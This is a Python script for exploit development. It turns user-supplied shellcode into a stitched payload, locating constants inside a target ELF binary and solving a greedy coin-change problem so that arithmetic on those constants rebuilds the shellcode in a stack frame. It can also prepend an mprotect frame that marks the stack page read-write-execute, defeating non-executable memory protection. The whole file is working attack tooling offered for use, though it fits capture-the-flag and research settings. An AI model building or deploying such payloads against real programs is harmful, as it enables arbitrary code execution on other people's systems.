#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
from argparse import ArgumentParser,ArgumentTypeError
from coinchange import solve_gready
from exutil import cmp2, pad_shellcode, switch_endianness, hex_str_repr_2_str
from elfnum import get_numbers, generate_payload, print_results
from payload import PayloadGenerator
import struct
from sys import argv, stderr

def slice_shellcode(shellcode, slice_size=4):
	"""
	Cuts the shellcode into slices of slice_size, converts the slice to integer and
	sorts the slices.
	Returns a list of tuples, each tuple containing the position of the slice in the
	shellcode, as well as the slice as integer
	"""
	slices = []
	for i in xrange(0, len(shellcode), slice_size):
		int_slice = int("0x" + shellcode[i:i + slice_size].encode("hex"), 16)
		slices.append((i,int_slice))
	return sorted(slices, key=lambda s:s[1])

def get_slice_gaps(slices):
	"""
	Calculates the offset between 2 shellcode gaps and stores it along with the slice offset
	Return a list of tuples containing the position of the slice in the shellcode as well as 
	the difference between the current slice and the previous one
	"""
	slice_sum = 0
	slice_gaps = []
	for i, current_slice in enumerate(slices):
		if i == 0:
			slice_gaps.append(current_slice)
		else:
			previous_slice = slices[i - 1]
			slice_gaps.append((current_slice[0], current_slice[1] - previous_slice[1]))
	return slice_gaps

def parse_arguments():
	"""
	Just argument parsing and housekeeping. Nothing to see.
	"""

	def int_or_hex(string):
		"""
		Returns an integer wheather the input string is a plain integer (123) or in hex format (0x123)
		"""
		try:
			if string.startswith("0x"):
 				number = int(string, 16)
 			else:
				number = int(string)
		except ValueError as ve:
			raise ArgumentTypeError("argument must be a number (hex or int)")
		return number

	def int_or_hex_cmp2(string):
		"""
		Returns an integer wheather the input string is a plain integer (123) or in hex format (0x123)
		"""
		try:
			if string.startswith("0x"):
 				number = cmp2(int(string, 16))
 			else:
				number = int(string) & 0xffffffff
		except ValueError as ve:
			raise ArgumentTypeError("argument must be a number (hex or int)")
		return number

	parser = ArgumentParser(description="Build a payload using binary stitching. Creates a python payload for the provided shellcode using numbers embedded in the binary.")
	parser.add_argument("filename", help="The binary to analyze")
	parser.add_argument("-x", "--shellcode", help="The shellcode for which you wish to build the payload", required=True, type=str)
	parser.add_argument("-s", "--section", help="The section you wish to search for numbers in. The default contains all RO sections.", action="append", type=str)
	parser.add_argument("-S", "--segment", help="Use segments instead of sections for the search. Yields more results, but you can get numbers which will change during runtime. If -s i set, use the specified section to retrieve the segment. Default is not to use segments.", action="store_true")
	parser.add_argument("-n", "--value", help="Accumulator registers initial value", type=int_or_hex_cmp2)
	parser.add_argument("-m", "--nomprotect", help="Do not generate an mprotect stack frame in front of payload. Default is False.", action="store_false")
	parser.add_argument("-p", "--prologue", help="Prints the payload prologue. Default is False", action="store_true")
	parser.add_argument("--version", help="Print the program version to screen", action="version", version="%(prog)s 1.0.0")
	parser.add_argument("-f", "--frame", help="Address of the stack frame where to build the payload", type=int_or_hex)
	parser.add_argument("-v", "--verbose", help="Print debugging information to screen. To ignore errors, redirect stderr to /dev/null.", action="store_true")
	args = parser.parse_args()
	return args

def get_page_start(address, page_size=0x1000):
	return address & -page_size

def build_mprotect_stack(stack_frame, ret_addr, page_size= 0x1000, num_pages=1):
	RWE = 0x7
	mprotect_stack = struct.pack("<I", ret_addr)
	mprotect_stack += struct.pack("<I", get_page_start(stack_frame, page_size))
	mprotect_stack += struct.pack("<I", page_size*num_pages)
	mprotect_stack += struct.pack("<I", RWE)
	return mprotect_stack
	

if __name__ == "__main__":

	args = parse_arguments()

	shellcode = args.shellcode
	binary = args.filename
	prologue = args.prologue
	stack_frame = 0x0804a120 if args.frame is None else args.frame
	initial_reg_value = 0 if args.value is None else args.value
	section_names = args.section
	use_segment = args.segment
	prepend_mprotect = args.nomprotect
	
	python_code = ""
	accumulator_value = prepend_mprotect
	
	if (section_names is None) and (not use_segment):
		section_names = (".hash", ".gnu.hash", ".dynsym", ".dynstr", ".gnu.version", ".gnu.version_r", ".rel.dyn", ".rel.plt", ".init", ".plt", ".text", ".fini", ".rodata", ".comment")
	elif (section_names is None) and use_segment:
		section_names = (".text",)
	
	if prepend_mprotect:
		bin_shellcode = "%s%s" % (build_mprotect_stack(stack_frame, stack_frame + 0x10), hex_str_repr_2_str(shellcode))
	else:
		bin_shellcode = hex_str_repr_2_str(shellcode)

	try:
		f = open(binary, "rb")
	except Exception as ex:
		print("Can't open file %s: %s" % (argv[1], ex), file=stderr)
		exit(1)

	if bin_shellcode is not None:
		slices = slice_shellcode(switch_endianness(pad_shellcode(bin_shellcode, pad_char="\x00")))
		print(slices)
		slice_gaps = get_slice_gaps(slices)
		candidates = get_numbers(f, section_names, 0xffffffff, use_segment=use_segment, no_null_bytes=True)
		#candidates = get_numbers(f, section_names, slice_gaps[0][1], use_segment=True, no_null_bytes=True)
		f.close()
		coins = list(set(candidates.values()))

		pg = PayloadGenerator()
		if prologue:
			python_code += pg.add_prologue()

		first = True
		for gap in slice_gaps:
			# Not elegant, but for first element, remove the initial value of accumulator register
			if first:
				first_gap = list(gap)
				accumulator_value += first_gap[1] - 1
				first_gap[1] = abs(cmp2(first_gap[1] - initial_reg_value))
				print(first_gap[1])
				gap = tuple(first_gap)
				first = False
			else:
				accumulator_value += gap[1]
			print(gap, hex(gap[1]))
			num_ops, nums = solve_gready(coins, gap[1])
			print(num_ops, nums)
			print_results(candidates, nums)
			python_code += pg.add_payload(candidates, nums, stack_frame + gap[0])

	python_code += '# Accumulator register has a final value of: %d => 0x%08x' % (accumulator_value, accumulator_value)
	print(python_code)

